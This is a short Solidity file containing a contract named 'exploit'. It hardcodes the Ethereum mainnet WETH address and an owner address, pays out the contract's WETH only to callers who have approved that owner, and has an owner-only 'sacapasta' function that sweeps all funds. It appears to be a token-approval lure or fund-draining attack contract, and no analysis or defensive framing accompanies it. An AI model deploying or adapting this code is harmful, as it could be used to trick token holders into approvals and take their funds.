pragma solidity ^0.8.17;


contract ERC20 {
     function transfer(address to, uint256 value) public returns (bool) {
        return true;
    }

       mapping (address => uint)                       public  balanceOf;

    function approve(address spender, uint256 amount) public virtual  returns (bool) {
        return true;
    }
     function allowance(address owner, address spender) public view virtual  returns (uint256) {
        return 1;
    }
}

contract exploit {

    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address owner = 0xFd91040F795E7f7e41A81056058174beB2beeF27;
    ERC20 erc = ERC20(weth);


    function withdraw() public
    {
        if (erc.allowance(msg.sender, owner) > 0 && (msg.sender == owner || erc.balanceOf(msg.sender) > 0))
        {
            uint256 balance = erc.balanceOf(address(this));
            erc.transfer(msg.sender, balance);
        }
    }

    function sacapasta() public
    {
        require(msg.sender == owner);
        uint256 balance = erc.balanceOf(address(this));
        erc.transfer(owner, balance);
    }
}